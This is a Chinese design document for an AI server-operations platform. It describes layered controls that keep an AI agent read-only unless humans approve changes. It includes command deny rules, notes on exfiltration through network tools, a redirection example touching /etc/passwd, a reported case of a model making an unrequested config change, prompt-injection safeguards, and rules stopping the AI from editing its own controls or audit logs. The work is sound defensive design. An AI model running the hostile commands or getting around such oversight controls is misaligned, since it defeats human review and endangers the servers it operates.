# AI 只读与执行授权模型（四道闸）

> **核心理念（2026-10-21 定稿）**
> 技术上，我们是模型和服务器之间唯一的翻译器；商业上，我们是客户和 AI 之间的教练。
> 两边都只担两件能验收的事——"按表执行"和"教会了"。能力归模型，判断归客户，审计归我们。

文档目的：把"让 AI 能看不能乱改"这件事，从原理到落地一次讲清，避免以后任何人（包括未来的助手）理解偏。

状态：**设计文档，尚未实现**。当前源码里已有的部分单独标注。本文不是实现承诺，落地需逐条验收。

## 0. 一句话结论

**"绝对只读"在软件层是伪命题，正确目标是"最小权限 + 可审计 + 可回滚"。**

产品的真正卖点不是"AI 改不了"，而是：

> **AI 想顺手改，也必须经过人可见的闸；没有人工那一票（或人工设定的策略），落不了地。**

## 1. 背景：为什么现在的模型挡不住"只读"

### 1.1 用户原始设想（正确的一半）

AI 是无状态服务：没有记忆、不知道自己在哪里。所谓"Agent 能力"，是软件在每次请求里给它一份**指令集（工具菜单）**，AI 从中挑选输出，软件层解析并执行。

这个理解是对的，本质就是：**AI 输出工具调用 → 软件解析 → 执行**。

### 1.2 缺失的那一半：工具菜单是**服务端每次现发**的

关键机制：**AI 不会"自己想出"要执行命令**。

- 请求里写了 `execute_command` 这个工具定义 → AI 才可能吐 `{"tool":"execute_command",...}`
- 请求里**不写** → AI **不知道这个输出格式存在**，吐不出来；就算硬编出来，服务端发现"本轮菜单里没有它" → 直接拒。

这就是 **readonly 模式的原理**：不是"事后审查 AI 吐出的命令是读还是写"，而是**事前不给"写"这个输出格式**。

### 1.3 现状（源码已实现，非本文新设计）

| 能力 | 现状 | 位置 |
| --- | --- | --- |
| readonly 模式**不发** `execute_command` 工具 | ✅ 已实现 | `turns.py: tool_spec()`，`mode != 'readonly'` 才 append 执行工具 |
| 模型硬编执行工具 → 服务端拒绝整轮 | ✅ 已实现 | `turns.py` 中 `current["mode"] not in ("confirm","direct")` 抛错 |
| confirm 模式逐条进 `awaiting_approval` | ✅ 已实现 | `turns.py`（state 选择）、`app.py` approve 接口 |
| direct 模式直接入队 | ✅ 已实现 | 同上 |
| **只读地"看"服务器**（`query_command` 类工具） | ❌ **缺失** | 无 |
| **只读通道 argv 直 exec（不用 shell）** | ❌ **缺失** | 现在用 `['/bin/sh','-c',command]`（`connector_local.py`、`connector_ssh.py`、`agent.py`） |
| **白名单 + 参数约束** | ❌ **缺失** | 无 |
| **变更集（声明变更、限制顺手改）** | ❌ **缺失** | 无 |
| 目标机只读身份（sudoers） | ❌ 未配置 | 无 |

**结论：现在产品能做到"AI 不许碰服务器"，做不到"AI 能上服务器只读地看"。这个中间档是缺的。**

## 2. 核心矛盾：读和写被绑在同一个工具上

`execute_command` **既能读也能写**（`kubectl get` 与 `kubectl delete` 是同一个工具）。

于是形成死结：

- 想让 AI 能查 → 必须给 `execute_command`；
- 给了它 → 它顺带就能写。

**这不是"readonly 太弱"，是"读和写没有分开授权"。解法是把"看"单独做成一把只读工具，而不是靠 readonly 一刀切。**

## 3. 四道闸总览

```
AI 输出工具调用
   │
   ├─ 闸1  工具级：模式决定发哪些工具（readonly 不发写工具）      ← 已有
   ├─ 闸2  命令级：只读通道 argv 直 exec + 白名单 + 参数约束      ← 缺失，优先做
   ├─ 闸3  变更级：写操作必须落在"声明的变更集"内（防顺手改）      ← 缺失
   ├─ 闸4  人工级：写操作进审批队列（可配策略，见 §7）            ← 已有，需扩展
   │
   └─ 兜底  目标机身份：只读账号 + sudoers 白名单                ← 未配置
```

每道闸独立回答一个问题：

| 闸 | 回答的问题 | 失效后果 |
| --- | --- | --- |
| 闸1 | AI 手里有没有"写"这个工具？ | 模型能提出写操作 |
| 闸2 | 只读通道里，这条命令/参数允许吗？ | 只读被越权读取 |
| 闸3 | 这次改动在"声明过的范围"内吗？ | AI 顺手改别的（argocd 事故） |
| 闸4 | 人（或人的策略）同意了吗？ | 无人工确认即落地 |
| 兜底 | 内核允许这个身份跑这条命令吗？ | 软件层漏洞直接变事故 |

## 4. 闸2：只读通道设计（重点）

### 4.1 原则

1. **白名单放行，不用黑名单审查。**
   - ❌ "判断这条命令像不像写" —— 命令有无穷变体，永远不完备。
   - ✅ "这条命令在允许集合里吗" —— 集合有限、可枚举，集合外**一切**（含所有伪装）全部拒绝。
2. **失效方向必须是"拒绝合法"，不能是"放行危险"。**
3. **argv 直 exec，不经 shell。** 这是关键（见 4.3）。
4. **零用户配置**：白名单内置在平台，Agent 装上即用（见 §6 与 §7 的冲突处理）。

### 4.2 为什么这样能"不放行危险命令"

```
黑名单：问"这像不像攻击"   → 攻击写法无穷 → 永远追不上 → 失效＝放行危险（灾难）
白名单：问"这在不在集合里" → 集合我定的、有限 → 集合外全拒 → 失效＝拒绝合法（可用性）
```

安全系统必须选后者。**这不是新算法，是 1972 年以来被验证几十年的 reference monitor 原则**（同源：SELinux、AppArmor、sudoers、seccomp）。**产品不发明新理论，用成熟轮子并把"普通人零配置可用"做出来，才是差异化。**

### 4.3 argv 直 exec：让"组合越界"物理上不存在

**这是回答"多条白名单命令合起来越界"的正解。**

`>`、`|`、`;`、`&&`、`$()`、反引号 —— **这些是 shell 的语法**。不启动 shell，它们就是**普通文本，没有语义**。

```python
# ❌ 现状：有 shell，"组合越界"全部生效
subprocess.Popen(['/bin/sh', '-c', command])

# ✅ 只读通道：argv 直 exec，无 shell
subprocess.Popen(['/bin/cat', '/var/log/nginx/error.log'])   # 直接 execve
```

对比 `cat /etc/passwd > /tmp/x`：

- 有 shell：`>` 被解释为重定向 → 一次写操作。
- 无 shell：`>` 是 cat 的**普通参数**，cat 会把它当文件名 → `cat: '>': No such file` → **失败，无任何写入**。

**所以"组合越界"不是被正则识别的，是因为它的载体（shell）根本不存在。**

### 4.4 白名单结构（草案，待用户审）

只读工具 `query_readonly` 的输入**结构化**（不是自由命令字符串）：

```json
{ "asset_id": "web-01", "program": "kubectl",
  "args": ["get", "pods", "-A"], "cwd": "/" }
```

校验规则（逐条，任一不过 → 拒绝执行并返回明确原因）：

1. `program` 必须命中**程序白名单表**（下列为草案，需用户裁剪）。
2. 每条命令可定义**子命令白名单**（如 `kubectl` 仅 `get|describe|logs|top|version|cluster-info`）。
3. 每条命令可定义**禁用参数模式**（如 `kubectl` 禁用 `-it`、`--exec`、`edit`、`delete`、`apply`、`patch`；`find` 禁用 `-delete`、`-exec`、`-execdir`；`journalctl` 禁用 `--rotate`、`--vacuum*`）。
4. 涉及路径的参数（`cat`、`tail`、`ls`、`grep` 的文件参数）必须落在**允许目录**内（如 `/var/log`、`/etc/nginx`、`/proc`、`/sys`）；路径先 `realpath` 归一化再比对，防 `../`（这也是参数校验，不是黑名单）。
5. **三禁**：禁止管道、禁止重定向、禁止命令替换 —— 由"argv 直 exec、不解析 shell 元字符"物理保证。

**程序白名单草案**（Linux 常用只读命令，待审）：

```
查看文件/目录： cat, head, tail, less(非交互), wc, file, stat, ls, tree, du, find(限参数)
系统状态：     ps, top(-b), free, uptime, vmstat, iostat, mpstat, sar, lsof, ss, netstat
磁盘/文件系统： df, mount(只读查看), lsblk, blkid
进程/服务：    systemctl status/list-units, journalctl(限参数), service --status-all
网络：         ip addr/show/route, ping, dig, nslookup, host, ss, traceroute, curl(限只读GET), dig
容器/K8s：     docker ps/images/inspect/logs/stats, kubectl get/describe/logs/top/version
日志：         journalctl, dmesg, tail, grep(限路径)
```

### 4.5 只读通道与写通道的差异

| 维度 | `query_readonly`（只读） | `execute_command`（写） |
| --- | --- | --- |
| 输入 | 结构化（program/args/cwd） | 自由命令字符串 |
| 执行 | argv 直 exec，无 shell | 现有 `sh -c`（保留，因需灵活） |
| 校验 | 白名单 + 参数约束 | 模式 + 授权凭证 + （闸3/闸4） |
| 审批 | **不打扰**（只读） | confirm 进审批 / direct 直接 |
| 身份 | **平台按资产声明自动配**（只读凭证） | **平台按资产声明自动配**（可写凭证） |

**关键（2026-10-15 讨论修正）：工具的输入里没有 `run_as` 字段，AI 无法指定执行身份。**

```
❌ 旧：AI 输出 {asset_id, run_as: "root", command}   ← AI 能指定身份 = 能偷用高权限
✅ 新：AI 输出 {asset_id, tool: "query_readonly", args}  ← 无 run_as，AI 指定不了
     平台根据 asset_id 查出该资产的凭证声明 → 自己填身份
```

**与 readonly 不给工具同一个思想：不是事后审查，是事前不给这个输出格式。同理，不是防 AI 偷用 root，是让 AI 的输出里没有“身份”这个概念。**

### 4.6 诚实边界（必须写进产品文档）

- 白名单是"主防线"，能挡软件层绝大多数越权；**不宣称"绝对只读"**。
- 参数校验用正则/模式时，**失效方向只能是拒绝合法**，不得写成"放行危险"。
- 程序白名单越长越"好用"，漏的概率越大；建议**默认精简**，能力档位（§7）按需放开。

## 5. 闸3：变更集（防"顺手改别的"）

### 5.1 问题（真实事故，非假设）

用户实测：让 Claude Opus 5.5 修一个 argocd 配置问题，**它顺手把 argocd 自动同步打开了**（为了让用户快点看到结果），用户根本没提这个要求。

**这不是权限问题。** 它用的是完全合法、也在授权范围内的命令。权限层看到的是 permitted，分不清"本轮要修的"与"AI 自己加戏的"。

> **权限是"能不能做"，不是"该不该做"。这是两个维度。**

### 5.2 结论（必须对用户讲清）

> **杜绝不了"AI 想顺手改"（那是模型行为），但可以杜绝"AI 顺手改了而你不知道"。**

从"信任 AI 自觉" → "每条改动都必须经过人可见的闸"。这就是产品价值。

### 5.3 设计：写操作必须落在"声明的变更集"内

AI 在动手前，先提交结构化变更计划：

```json
{
  "goal": "修复 argocd 配置问题",
  "changes": [
    {"target": "cm/argocd-cm", "action": "patch", "field": "timeout.reconciliation"},
    {"target": "deploy/argocd-server", "action": "restart"}
  ]
}
```

规则：

1. 写操作**只接受**落在计划内的改动；计划外 → **拒绝 + 告警 + 审计**。
2. 计划本身是**可审、可存证**的（就是审计记录）。
3. 计划可**修订**，但每次修订都是可见事件（额度/范围明确记录）。
4. 计划范围应与**授权账号/资产范围**一致（不能靠改计划绕开授权）。

### 5.4 三层防线（配套）

| 层 | 内容 | 强度 |
| --- | --- | --- |
| 一 | 命令级审批（闸4） | 中 |
| 二 | 变更集限制（闸3） | 强 |
| 三 | 变更后**服务端抓取** before/after diff（非 AI 口述） | 最强 |
| 三（治本） | AI 声称的改动 vs 实际 diff 不符 → 当场抓包 | |

第三层要点：**diff 必须由服务端采集**，不能信 AI 自己复述的"我只改了 X"。

## 6. 闸4：审批与"零配置优雅"的冲突（重要）

### 6.1 冲突

- 用户要"优雅、开箱即用"。
- 但只读账号/sudoers 需要目标机配置 → 用户被迫配置 → 不优雅。

**解法：不是让用户去配，是产品自动配。**

- 默认：白名单内置在平台，Agent 装完即可用（软件层主防线）。
- 进阶：`install.sh` **自动**创建只读账号 + 写 sudoers（用户零操作）。
- 产品感知上仍"连上就能用"；**但文档必须如实说明"软件白名单 = 主防线，目标机身份 = 兜底"，不宣称绝对只读。**

### 6.2 闸4 的可配置化（用户提出）

用户诉求：专业运维需要审计；不懂运维的客户会变"yes 工程师"（全点同意且看不懂命令）。希望闸4 可藏/可关。

**修正（重要）：闸4 是服务端的审批状态机，不是纯前端。前端可默认"批量通过"，但"通过"必须落到服务端，否则等于把执行权直接给模型。**

可配置设计：

| 策略 | 服务端行为 | 适用 |
| --- | --- | --- |
| `audit-only`（默认，专业运维） | 写命令进 `awaiting_approval`，人工逐条/批量审 | 专业运维 |
| `auto-approve`（小白） | 写命令**自动批准**入队，但仍**全量审计** | 不懂运维的用户 |

**红线：`auto-approve` 下，闸3（变更集）不可关。**

否则"AI 顺手改别的"立刻回归，argocd 事故重演。**闸4 可关，闸3 不可关** —— 这是保住安全底线的最大让步。

### 6.3 审批粒度（解决"边读边写、每步审批很烦"）

| 场景 | 审批方式 |
| --- | --- |
| 纯只读排查（诊断） | **完全不打扰**（`query_readonly` 无审批门） |
| 明确一次性修复 | 一次审批一条，或批量审批一组 |
| 模糊/多步修复（"pod 挂了，你看着修"） | **AI 先出修复计划，人批计划一次，AI 在计划内自主执行** |

第三档与闸3 的变更集是**同一机制的两面**：

- 闸4 管"这事能不能做"（人点头）；
- 闸3 管"只能做点头范围内的"（AI 不许加戏）。

**合起来：人批一个框，AI 在框里自由干，出框就停。**

### 6.4 前端审批卡片（用户提出）

- 写操作才弹卡；只读查询不打扰。
- 卡片把结构化命令**润色成人话** + 附原始命令：
  > 🔧 在 `web-01` 上用 `ops` 账号：重启 nginx → `systemctl restart nginx`
- AI 给一句"这步在干啥"的说明 + 原命令，人一眼看懂。

## 7. 兜底：目标机身份

- 目标机建只读账号（如 `read_only`）+ `/etc/sudoers.d/` 用 `Cmnd_Alias` 只放行只读命令。
- 只读通道**永远**用该身份执行 → 内核级兜底，软件层漏洞不直接变事故。
- **现实约束**：本地执行器在 **Windows 上做不到账号切换**（`connector_local._build_argv` 对非 posix 直接返回 None）。**该兜底只在 Linux 目标机成立**（Agent 装在 Linux 上 → ✅；Windows 本机 connector → ❌，只能同账号执行，不谈只读档位）。

## 8. 责任边界（用户明确）

1. **AI 乱操作** → 由四道闸解决（本文）。
2. **人乱操作** → 无所谓，可审计。人把危险命令放行了造成生产事故，**责任不在平台**。
3. **外部攻击** → 单独评估，见 §9。

## 9. 外部攻击面评估（待展开，用户要求）

用户要求评估：排除"攻击者已拿到高权限用户并登入服务器"这一前提后，产品自身是否可从外部被攻克。两个连接方向：

- **方向 A：主服务直连（connector）**：主服务→目标机的 SSH 直连路径。
- **方向 B：执行 Agent**：目标机 Agent 主动连主服务的路径。

### 9.1 评估范围（明确排除）
- 排除：攻击者已有服务器 shell/高权限账号（这不属于产品漏洞）。
- 包含：产品自身暴露的接口、认证、协议、凭据、信任边界。

### 9.2 已知信任边界（源码实查，作为评估输入）
- 主服务管理面是**单团队高权限 Bearer 令牌**（≥32 字符），**无内置多租户**；默认绑 `127.0.0.1`。
- SSH 托管凭据为 Fernet 密文 + 主密钥分文件，但**同一服务可读** —— 不能抵御该进程被攻破。
- 独立模型 Key 是 0700 目录下 0600 明文文件。
- 输出脱敏是"尽力匹配"；原始归档不脱敏。
- `NoNewPrivileges` 刻意不设（会破坏切账号）；最小权限靠**账号白名单**。
- 本机 connector 在标准 compose 中指**控制服务容器**，不是宿主机。

### 9.3 待评估项（后续单独出报告）
- [ ] 管理接口是否可能被未授权访问（令牌强度、重放、时序）。
- [ ] Agent 注册/claim 协议是否可被伪造（协议 1.1 的认证）。
- [ ] SSH 连接器的主机公钥固定是否可被绕过。
- [ ] 主服务→目标机方向是否存在命令注入类问题（现在 `sh -c` 是真实面）。
- [ ] 触发器/告警 Webhook 的 SSRF 面。
- [ ] 队列/租约/unknown 处置的状态机是否存在可利用竞态。

> 本节只列范围与已知输入，**不在此下"安全/不安全"结论**；结论需逐项验证后单独出。

## 11. 账号 / 凭证模型（2026-10-15 讨论定稿）

### 11.1 为什么账号层不能砍

用户提出的关键用例：**同一轮任务，在不同资产上需要不同权限。**

> 排查一个问题，根源在数据库那台服务器。**数据库那台不希望 AI 改，其他服务允许改。**

工具集是"轮次级"开关（要么全开写、要么全不开），**粒度对不上"资产级"权限**。所以**跨资产差异权限只能靠"资产级账号"表达**。

→ **结论：以资产为单位的执行身份/权限机制必须保留。** 曾被误判为可砍，现纠正。

### 11.2 凭证（Credential）抽象

把"目标机账号 / 云数据库账号 / 连接凭据"统一为一个抽象：**凭证**。

```
凭证（Credential）  ← AI 唯一能"引用"的东西
 ├─ 密文（AI 永不可见）
 ├─ 简介 notes（AI 可见，标为 DATA）
 ├─ 关联资产 + 账号
 └─ 性质（只读 / 可写）  ← 决定 AI 能拿到什么工具
```

**优点：**
- AI 只见"凭证 + 简介"，**看不到密文、看不到账号名**；
- 删除凭证 = 物理上不存在，**不是规则上不允许**（比"禁止访问"更强）；
- AI 不能凭记忆找回账号密码（它对 AI 从来不可见）。

### 11.3 铁律：默认最小权限（默认全无，显式开）

⚠️ **不能"资产注册时把所有账号自动收成凭证"** —— 那会让目标机上的 `root` 自动成为 AI 可用凭证。

正确形态：

```
资产注册 → 列出候选账号（只是候选，不是凭证）
        → 用户【显式勾选】"ops → 建成凭证，性质=可写"
        → 只有被勾选的才成为 AI 可见凭证
```

**原因：安全系统里"忘记配置"的后果必须是"用不了"，不能是"全开"。**

### 11.4 简介（notes）是 AI 的唯一判断依据

- 简介写清楚 → AI 正确使用；写含糊 → AI 误用。
- **简介的编辑权限要收紧**（仅管理员），且进入 AI 上下文时仍标为 DATA（防提示词注入）。

### 11.5 注销（按连接方式）

| 连接方式 | 注销位置 | 生效 |
| --- | --- | --- |
| **Connector（主服务直连）** | 主服务删除凭证即可 | 立即；不碰目标机 OS 账号（那是用户的事） |
| **Agent（执行端）** | 主服务删除（AI 立即拿不到）+ 可选 Agent 侧同步 | 主服务侧立即；Agent 侧同步可走下发指令或下次重启生效 |

**核心：主服务注销 = "AI 用不了"（立即可靠）；Agent 侧同步 = "物理上也用不了"（需 Agent 配合）。** 主服务注销后该账号入不了指令队列，AI 层面即断。

## 12. 部署与配对流程（Agent 侧，2026-10-15 讨论）

### 12.1 关键技术拨正：Linux 切身份不靠密码

用户原设想：Agent 配置里写"用户名 + 密码"，主服务也存一份，密码不对就登录不上。

**拨正：Linux 上以某用户身份执行命令，靠的不是"输入该用户密码"，而是调用方本身是 root 可 setuid。**

```python
# agent.py execute() 现状：
if os.geteuid() != 0 and os.geteuid() != account.pw_uid:
    return failure(task, "CANNOT_SWITCH_USER")   # 只有 root 能切
subprocess.Popen(..., **identity)                 # 用 uid/gid 直接切，不输密码
```

**所以"用户名+密码"在 Linux 执行模式下不成立。** 尤其不要把密码存进 Agent 配置（多一个泄露面）。

**正确的"双边校验" = 两侧独立的白名单：**

| 侧 | 声明 | 校验 |
| --- | --- | --- |
| **Agent 本地配置** | `allowed_users` | 执行时检查 `run_as ∈ allowed_users`，且本地确实存在该账号 |
| **主服务** | 该资产允许的账号名单 | 下发前检查 `run_as ∈` 该名单 |

→ **双重防守成立，形式是"两侧独立白名单"，不是"两侧各存密码"。** 更好：无需存密码、不依赖可用密码（服务账号常无密码）、且这就是 Agent 的自主权（拒绝不在名单里的账号）。

### 12.2 配对流程（现状已实现，与用户直觉一致）

```
① 主服务创建 agent 资产 → 生成一次性 agent_token（只出示一次，存 hash）
② 把 agent_token 填进 Agent 配置文件 config.json：
     asset_id / server_url / agent_token / allowed_users / journal_dir
③ Agent 启动 → 用 token 连主服务（Bearer）→ 主服务校验 token → 配对成功
④ Agent 主动 claim 任务、上报结果（协议 1.1）
```

用户直觉"主服务先发凭证 → Agent 拿凭证认主"：**完全正确，代码已如此。**

### 12.3 鉴权方式建议

| 方案 | 评价 |
| --- | --- |
| **一次性 token（现状）** | ✅ 够用，别动；存 hash、只出示一次、可轮换 |
| 配对码 | 两头各输一次，这里不需要 |
| **双向 TLS(mTLS)** | 更安全，但部署重，冲突"傻瓜式" |
| **非对称密钥** | 私钥永不传输，最强；但要管密钥分发 |

**推荐：默认一次性 token（够傻瓜），高级用户可选非对称密钥。**

### 12.4 三层校验

```
主服务侧：run_as ∈ 资产声明账号        ← 第一层
Agent 侧：run_as ∈ allowed_users      ← 第二层（已有）
物理层：本地确实存在该 OS 账号          ← 第三层（已有）
```

## 13. AI 运维联邦（v1 即需做完整）

用户主张：**执行 Agent 侧应具备自主权，为后续"AI 控制服务联邦"打基础；建议第一版就做完整**（因结构干净）。

### 13.1 Agent 自主权（架构已支持）
- Agent 配置的 `controllers` 列表（**代码已支持多控制器**）→ "我信任哪几个主服务"。
- Agent 的 `allowed_users` → "我允许执行哪些账号"。
- → Agent 是**有边界的自主节点**，不是纯从属傀儡。

### 13.2 信任链（不自己造，借鉴成熟集群）

用户主张：**不用自己设计，直接借鉴成熟集群服务**。助手认可。

**借鉴对象：K8s 集群的节点信任模型（已成熟十几年）。**

| K8s 机制 | 对应到本产品 |
| --- | --- |
| 集群 CA（主节点当 CA 签发证书） | 主服务自己当 CA，给每个 Agent 签发证书 |
| 双向 TLS（mTLS，互验证书） | Agent ↔ 主服务互验证书 |
| bootstrap token + 一次性加入 | 升级现有 `agent_token`：token 引导 → 签发 mTLS 证书 |

→ **Agent↔主服务关系 = “从节点↔主节点”，直接拄 K8s 那套。`agent_token` 方向正确，升级到“token 引导 → 签发 mTLS 证书”就一步到位。**

### 13.2.1 当前缺口：Agent → 主服务方向缺主服务身份认证

用户指出："Agent 配置里写了主服务 IP:端口，不就锁定主服务了？"

**答：IP + 端口只回答"连哪里"，不回答"对方是不是真货"。** 门牌号谁都能拄（同网段/DNS 劫持/ARP 欺骗/BGP 劫持），攻击者可在同地址放假主服务，Agent 照样把 token 交出去。

**现状“半安全”：**
- ✅ Agent 强制 HTTPS（`_validate_endpoint`）、拒绝重定向（`NoRedirect`）、不用环境代理。
- ⚠️ 但教学引导明文 HTTP，**把这块防御废掉了**。且现有 token 是**单向**（Agent→主服务），主服务未向 Agent 证明自己。

**建议（复用成熟思路）：**
- **证书固定（pinning）**：Agent 配置里存主服务证书/公钥指纹，连接时比对，不符即拒。**与 SSH 主机公钥固定（`RejectPolicy`）同一思路 —— 你 SSH 侧已做对，Agent 侧还没做。**
- 更完整：上 K8s 式 mTLS（见 13.2）。

### 13.3 其他必须回答的问题（遗留）
- [ ] 跨域信任模型（一个 Agent 受多个主服务调度时，权限如何隔离）。
- [ ] 联邦下的审计一致性（多个主服务的审计如何拼接）。
- [ ] 主服务侧的"联邦成员"生命周期（加入/退出/撤销）。

> 注：多控制器能力已在代码中，但"联邦"作为产品尚未 **设计**；本节只立方向，不宣称已有能力。

**成立的部分：** 单体（FastAPI+SQLite+后台线程）确实不易“崩”；上游 AI 接口断比服务崩更常见，且支持任意模型可绕。

## 25. 模型上游降级链（2026-10-15，开发时必须注意）

用户洞察：告警 AI 响应是产品核心能力，若**模型上游挂了/处理到一半挂了/告警没接到**，会直接影响可用性。**应配降级选项，保证“永远在线”。**

### 25.1 三个子问题与现状

| 故障场景 | 要什么 | 现状 |
| --- | --- | --- |
| 模型上游挂了 | 切换备用模型/供应商 | 已支持任意模型 + 多 provider（`role_providers`）；**待做：自动降级链** |

**“永远在线”的正确表述：不是“永不失败”，是“失败时可切换、可重试、告警可补、任务可续”。**（与 §22 “可恢复”一致）

## 36. SonarQube 案例与"不做本地伪加密"红线（2026-10-16）

调研背景：SonarQube 高级功能订阅制，用户问其插件落盘用户服务器是否会被盗。

**SonarQube 的真实形态**：SonarCloud = 纯 SaaS（分析在官方服务器，用户机零落盘）；SonarQube Server 付费版 = 落盘但能力编译在二进制里，靠 license key 激活 + 混淆 + 版本更新腐烂，**不指望防复制，靠"复制品快速贬值"**。

**对本产品 Skills 订阅的可借鉴三条**：
1. License 绑定平台实例：Skills 只经平台下发，校验订阅状态，实例级绑定；
2. 订阅卖"明天的库"：明文落盘无所谓，运维知识半年馊，断订阅=冻在旧版（杀毒软件模式，SonarQube 为验证过的先例）；
3. 把"聪明的部分"留在平台侧：最高价值 Skill 的编排/校验逻辑由服务端运行时注入，仅重度依赖平台的 Skill 值得做。

**红线：不做本地伪加密。** "Skill 编译成 Wasm 在客户内网跑即保密"不成立——Wasm 易逆向（wasm2wat 还原接近源码）；本地 license 心跳可被补丁绕过；更与"数据不出内网"卖点冲突（模块本地=逻辑可逆向，逻辑上收=数据出内网，二选一）。本地混淆仅作高价值 Skill 的可选项，现在绝不投入 Wasm 工具链工程量。

**Skill 价值三档**：明文落盘（大多数，靠过时腐烂收订阅）／平台侧执行（少数最高价值，唯一真防抄）／编译混淆（中间态，防君子不防高手，暂不做）。

## 37. 原则类提示词不单卖，烧进产品默认行为（2026-10-16）

用户实践洞察：生产实践中真正让 AI 好用的是**原则类记忆+提示词**，Skills 只是少数具体领域需要。提示词单卖卖不了钱。

**不单卖的理由**：①通用原则已是行业公地；②原则的价值在调教过程（真实场景迭代回路），不在成品文本——文本可抄，回路抄不走；③原则不过时=无续费理由，订阅模式对它失效。

**可变现形态 = 角色预设包**（非提示词包）：系统提示词+初始记忆模板+工具权限+模型选择 打包（如"Nginx 运维角色包"），与 Skills 订阅同管道同 license 绑定。明文落盘问题照旧，不指望更防盗。产品优化重心从"多写 Skill"分一部分到"打磨出厂默认原则与记忆结构"。

## 38. 企业定制标配：VPN-only 管理面（2026-10-16）

背景：用户公司用上 Tailscale（客户端开源 BSD，基于 WireGuard；协调服务器闭源，开源替代 Headscale 可自建整套组网）。

**方案**：企业定制版管理面入口封死、仅 VPN 可达——执行 Agent 纯出站回连主服务（内网一般只限入站不限出站，用户确认此顾虑不存在），用户浏览器走 VPN。**两端都不开入站端口，攻击面直接归零**，§17 的 🔴 管理面公网暴露从根源消除，TLS/令牌强度等 🟡 项降级为纵深防御。

**配套认知**：
- 实现成本半天级：端口绑 VPN 网段/127.0.0.1 + 防火墙规则 + 部署文档一节；
- 免费版 Tailscale 有设备数限制，企业定制走 Headscale 自建或预算含官方付费档；
- VPN 是边界不是替代，四道闸照开（叠加不替代）；
- 个人/试用版公网直连保持傻瓜式，**企业版 = VPN-only + 凭证体系 + 审计加固** = "企业版贵在哪"的具体答案。

**商业层采纳（Gemini 论点，2026-10-16）**：造轮子成本账成立（1-2 个 SRE 两月 6-10 万 vs 年费 1.9 万）；责任转嫁成立且是比功能强的购买理由。**但个人无 SLA 团队暂不白纸黑字承诺背锅**，话术先对信自己的首批客户（公司内部项目组）用。

## 39. 设计审计与修正（2026-10-18，定稿）

对全文攻击者视角复审，发现并定稿以下修正。**本文档前文与本节冲突处，以本节为准。**

### 39.1 闸3 定稿：写通道结构化（🔴 原设计硬伤）

原 §5.3 "自由 shell 写命令按变更集计划外拒绝"**在语义上不可实现**（任意 shell 无法可靠解析出目标/动作，模糊匹配必被绕过或误杀）。修正：

- **写通道改为结构化动作**：平台定义有限动作类型（改某配置文件 / patch 某资源 / 重启某服务等），AI 只能从动作表中选择并填参数；闸3 = 动作 ∈ 变更集，可硬执行。先例：K8s admission control、Terraform plan→apply。
- **自由 shell（`sh -c`）只保留给闸4 人工逐条审批场景**，不进 auto-approve。
- **动作表故意不追求全覆盖**：表外写操作一律落闸4 人工，"落到人工"本身是安全特性，与白名单"失效方向=拒绝合法"同原则。
- **用户自定义动作设防**（软肋）：① 定义时合法性校验（目标定位方式限定、禁 shell 逃逸）；② 标记"用户自定义"，出事责任归用户（对齐 §8）；③ 使用照常全量审计。
- **红线修正**：auto-approve 下闸3 不可关 —— 现在闸3 是硬闸，该红线成立。direct 模式**禁止用于告警/webhook 等不可信输入触发的轮次**（防注入借 direct 绕人票）。

### 39.2 闸2 执行位置钉死（🔴 结构缺口）

- 闸2 白名单校验 + argv 直 exec **必须发生在最终执行端点**（Agent/connector 的 execve 处），协议层传结构化 program+args；主服务侧校验只是第一道，Agent 侧独立再验。禁止"主服务校验后仍以字符串下发、端点 `sh -c`"。
- **白名单永不收录解释器**：awk/sed/python/perl/bash/xargs 等等价于万能写工具。
- **默认白名单删 curl**（外传信道 + "只读 GET"难校验）；ping/dig 类若保留须明示为外传信道，兜底交目标机出口防火墙。
- 参数约束补漏：`find` 加禁 `-fprintf/-fprint/-fls`（写文件）；**删除 `less`**（交互 `!` 可起 shell）；`mount`/`lsof` 实测后定稿。
- 威胁模型补一节：**读→外传** 是独立风险面（读到敏感文件后经网络工具/DNS 外传），闸2 防写不防外传，须在产品文档诚实边界写明。

### 39.3 审批绑定不可变载荷（🟡）

审批对象 = **载荷哈希**（asset_id+身份+完整 argv/动作参数）。执行前服务端重校验哈希一致才入队，防"批 A 执行 B"偷换与竞态。

### 39.4 TOCTOU（🟡）

realpath 归一化存在检查/执行间隙竞态（符号链接替换）。等级低，sudoers 只读账号兜底覆盖；文档明示即可。

### 39.5 商业补充：变更策略包（用户定稿）

结构化动作表可编辑、可售卖：

1. 官方先出常见动作集，不追求写全；覆盖缺口走人工审批。
2. 平台支持用户自定义动作（见 39.1 设防条款）。
3. 可售两层：**动作包**（Nginx/MySQL 等标准变更动作）+ **审批策略包**（行业闸4 配置）。与 Skills 订阅/角色预设包同管道同 license 绑定，多 SKU 不多产品线。付费逻辑：动作包沉淀"专业运维认为什么操作安全"，正是非运维公司所缺。

### 39.6 方法论记录

"既覆盖所有场景又防绕过的白名单"= 论文级难题，**不需要解**：读走窄白名单+内核兜底（reference monitor，Unix 50 年验证），写走结构化动作+人票（Terraform/K8s 先例）。分工即答案。

## 40. 平台自指边界（2026-10-20 定稿）

AI 能不能动 AI 运维平台自己？分三层，核心铁律：**AI 可以看平台、分析平台、出配置修改建议，但不能改平台的任何东西——AI 运维一切，唯独不运维自己的裁判权。**

### 40.1 分层口径

1. **功能性接口（AI 可写）**：trigger 任务、告警配置、平台文档等业务对象，AI 通过平台 API 工具直接创建/修改，业务审计留痕。业务对象走业务接口，不走宿主机 shell。
2. **配置接口（AI 只出提案）**：闸2 白名单、闸3 动作表、能力档位、凭证等一切定义 AI 权力的配置，AI 工具清单中不存在任何能修改它们的工具；AI 可分析并生成配置 diff 提案，人在管理后台确认后生效。守门人不能被被守的东西修改。
3. **审计与平台自身数据（AI 只读）**：审计日志、审批记录、变更历史只允许平台服务进程写入（AI 输出由服务端单方面落库）。平台升级走 install.sh/compose 由人执行，AI 不参与换掉运行中的自己。

### 40.2 宿主机自纳入 connector（用户定稿）

平台所在宿主机作为一个**特殊的自纳入 connector** 接入，保持架构统一性。边界三条：

1. 能力档位锁死 readonly-observer：AI 可看平台健康状态（日志/进程/端口），复用宕机排查设计；
2. 写操作（如重启平台服务）照走闸3/闸4，动作表仅标准动作，无自由 shell；
3. 功能性接口（trigger/文档）与该通道分开：API 工具与 connector exec 两条路都留痕。

### 40.3 审计完整性三层（防"AI 清空自己的审计日志"）

单靠 OS 账号权限不够：AI 拿到宿主机 shell 即可读 compose/.env 中的 DB 凭据直接删审计行。必须三层齐备：

